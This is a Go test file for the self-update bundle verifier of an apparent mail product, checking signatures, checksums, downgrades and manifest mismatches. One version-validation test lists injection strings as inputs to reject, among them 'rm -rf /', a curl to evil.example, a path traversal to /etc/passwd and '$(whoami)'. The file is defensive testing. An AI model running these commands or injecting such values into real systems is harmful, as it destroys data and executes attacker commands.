package selfupdate

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"testing"
)

func genKeyPair(t *testing.T) (pub ed25519.PublicKey, priv ed25519.PrivateKey, pubPEM []byte) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		t.Fatalf("marshal public key: %v", err)
	}
	pubPEM = pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})
	return pub, priv, pubPEM
}

func validBundle(t *testing.T, priv ed25519.PrivateKey, version string) (artifact, checksum, sig, manifest []byte) {
	t.Helper()
	artifact = []byte("fake-tarball-bytes-for-" + version)
	sum := sha256.Sum256(artifact)
	hexSum := hex.EncodeToString(sum[:])
	checksum = []byte(hexSum + "  dist/orvix-enterprise-mail-" + version + "-linux-amd64.tar.gz\n")
	sig = ed25519.Sign(priv, artifact)
	manifest = []byte(`{"schema":1,"product":"Orvix Enterprise Mail","version":"` + version +
		`","channel":"stable","commit":"deadbeef","build_time":"2026-01-01T00:00:00Z",` +
		`"target":"linux/amd64","artifact":"orvix-enterprise-mail-` + version + `-linux-amd64.tar.gz",` +
		`"artifact_sha256":"` + hexSum + `","sbom":"SBOM.spdx","sbom_sha256":"ignored"}`)
	return artifact, checksum, sig, manifest
}

func TestVerifyBundle_ValidBundlePasses(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.4")
	vb, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		artifact, checksum, sig, manifest, pubPEM, "1.0.3")
	if err != nil {
		t.Fatalf("expected valid bundle to pass, got: %v", err)
	}
	if vb.Version != "1.0.4" {
		t.Errorf("version = %q, want 1.0.4", vb.Version)
	}
}

func TestVerifyBundle_RejectsBadChecksum(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, _, sig, manifest := validBundle(t, priv, "1.0.4")
	badChecksum := []byte("0000000000000000000000000000000000000000000000000000000000000000  dist/x\n")
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		artifact, badChecksum, sig, manifest, pubPEM, "1.0.3")
	if err == nil {
		t.Fatal("expected checksum mismatch to be rejected")
	}
}

func TestVerifyBundle_RejectsBadSignature(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, _, manifest := validBundle(t, priv, "1.0.4")
	_, otherPriv, _ := genKeyPair(t)
	wrongSig := ed25519.Sign(otherPriv, artifact)
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		artifact, checksum, wrongSig, manifest, pubPEM, "1.0.3")
	if err == nil {
		t.Fatal("expected signature from wrong key to be rejected")
	}
}

func TestVerifyBundle_RejectsTamperedArtifactAfterSigning(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.4")
	tampered := append([]byte{}, artifact...)
	tampered[0] ^= 0xFF
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		tampered, checksum, sig, manifest, pubPEM, "1.0.3")
	if err == nil {
		t.Fatal("expected tampered artifact to fail checksum before signature is even checked")
	}
}

func TestVerifyBundle_RejectsManifestVersionMismatch(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.4")
	// Manifest says 1.0.4 but we claim the tag is 1.0.5 — an attacker
	// re-tagging an old artifact under a newer name.
	_, err := VerifyBundle("v1.0.5", "orvix-enterprise-mail-1.0.5-linux-amd64.tar.gz",
		artifact, checksum, sig, manifest, pubPEM, "1.0.3")
	if err == nil {
		t.Fatal("expected tag/manifest version mismatch to be rejected")
	}
}

func TestVerifyBundle_RejectsAssetFilenameMismatch(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.4")
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-9.9.9-linux-amd64.tar.gz",
		artifact, checksum, sig, manifest, pubPEM, "1.0.3")
	if err == nil {
		t.Fatal("expected asset filename/version mismatch to be rejected")
	}
}

func TestVerifyBundle_RejectsDowngrade(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.3")
	_, err := VerifyBundle("v1.0.3", "orvix-enterprise-mail-1.0.3-linux-amd64.tar.gz",
		artifact, checksum, sig, manifest, pubPEM, "1.0.4")
	if err != ErrDowngrade {
		t.Fatalf("expected ErrDowngrade, got: %v", err)
	}
}

func TestVerifyBundle_RejectsEqualVersionReinstallAsDowngrade(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.4")
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		artifact, checksum, sig, manifest, pubPEM, "1.0.4")
	if err != ErrDowngrade {
		t.Fatalf("expected same-version reinstall to be rejected as a downgrade, got: %v", err)
	}
}

func TestVerifyBundle_AllowsPrereleaseToStableProgression(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, manifest := validBundle(t, priv, "1.0.4")
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		artifact, checksum, sig, manifest, pubPEM, "1.0.4-rc1")
	if err != nil {
		t.Fatalf("expected rc -> final of the same core version to be allowed, got: %v", err)
	}
}

func TestVerifyBundle_RejectsMalformedManifestJSON(t *testing.T) {
	_, priv, pubPEM := genKeyPair(t)
	artifact, checksum, sig, _ := validBundle(t, priv, "1.0.4")
	_, err := VerifyBundle("v1.0.4", "orvix-enterprise-mail-1.0.4-linux-amd64.tar.gz",
		artifact, checksum, sig, []byte("{not json"), pubPEM, "1.0.3")
	if err == nil {
		t.Fatal("expected malformed manifest JSON to be rejected")
	}
}

func TestValidateVersionString(t *testing.T) {
	cases := []struct {
		in    string
		valid bool
	}{
		{"1.0.4", true},
		{"1.0.4-rc1", true},
		{"1.0.4-rc1.admin-console", true},
		{"", false},
		{"latest", false},
		{"1.0", false},
		{"1.0.4; rm -rf /", false},
		{"1.0.4 && curl evil.example", false},
		{"../../../etc/passwd", false},
		{"1.0.4/../1.0.5", false},
		{"$(whoami)", false},
		{"1.0.4\n1.0.5", false},
	}
	for _, c := range cases {
		err := ValidateVersionString(c.in)
		if c.valid && err != nil {
			t.Errorf("ValidateVersionString(%q) = %v, want valid", c.in, err)
		}
		if !c.valid && err == nil {
			t.Errorf("ValidateVersionString(%q) = nil, want rejected (injection attempt)", c.in)
		}
	}
}

func TestCompareVersions(t *testing.T) {
	cases := []struct {
		a, b string
		want int // sign only
	}{
		{"1.0.4", "1.0.3", 1},
		{"1.0.3", "1.0.4", -1},
		{"1.0.4", "1.0.4", 0},
		{"1.0.4", "1.0.4-rc1", 1},
		{"1.0.4-rc1", "1.0.4", -1},
		{"1.0.4-rc1", "1.0.4-rc2", -1},
		{"1.0.10", "1.0.9", 1}, // numeric, not lexical
	}
	for _, c := range cases {
		got, err := compareVersions(c.a, c.b)
		if err != nil {
			t.Fatalf("compareVersions(%q,%q): %v", c.a, c.b, err)
		}
		sign := 0
		if got > 0 {
			sign = 1
		} else if got < 0 {
			sign = -1
		}
		if sign != c.want {
			t.Errorf("compareVersions(%q,%q) sign = %d, want %d", c.a, c.b, sign, c.want)
		}
	}
}
